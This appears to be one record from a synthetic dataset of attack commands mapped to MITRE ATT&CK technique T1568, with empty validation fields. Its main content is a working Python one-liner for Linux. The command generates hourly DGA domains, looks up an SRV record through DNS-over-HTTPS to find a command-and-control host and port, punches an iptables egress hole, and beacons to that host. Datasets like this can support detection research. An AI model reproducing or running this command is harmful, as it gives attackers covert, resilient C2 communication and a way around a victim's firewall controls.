{
  "technique_id": "T1568",
  "platform": "Linux",
  "shell": "Python",
  "command": "python3 -c \"import json,random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='srv-seed'; tlds=['net','com']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d%H'))+seed\n    return [hashlib.sha1((base+str(i)).encode()).hexdigest()[:8]+'.'+tlds[i%len(tlds)] for i in range(n)]\ndom=None; target=None; port=None; ip=None\nfor d in dga(30):\n    try:\n        j=subprocess.check_output(['curl','-s','-H','accept: application/dns-json','https://dns.google/resolve?name=_c2._tcp.'+d+'&type=SRV'],timeout=5)\n        ans=json.loads(j).get('Answer',[])\n        if ans:\n            parts=ans[0].get('data','').split()\n            if len(parts)==4:\n                port=int(parts[2]); target=parts[3].rstrip('.') ; dom=d; break\n    except Exception:\n        pass\nif target and port:\n    resp=sr1(IP(dst='1.1.1.1')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=target,qtype='A')),timeout=3,verbose=0)\n    if resp and resp[DNS] and resp[DNS].an:\n        for a in resp[DNS].an:\n            if getattr(a,'type',0)==1:\n                ip=a.rdata; break\nif ip and port and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','4','--resolve',f'{target}:{port}:{ip}',f'https://{target}:{port}/hello','-k'])\n    print(dom,target,ip,port)\"",
  "explanation": "Discovers C2 endpoint using an SRV record hosted under a DGA domain, resolves the target host dynamically, then allows and tests connectivity on the SRV-specified port.",
  "rationale_steps": [
    "Generate DGA domains hourly to vary SRV targets.",
    "Query SRV via DoH to obtain port and target host.",
    "Resolve the SRV target A record with scapy.",
    "Insert a targeted iptables allow rule and beacon over the indicated port."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1568-c17789a5-4fe2210b",
  "source_prompt_hash": "c17789a5",
  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
  "validation": {
    "syntax_ok": null,
    "llm_judge": null,
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}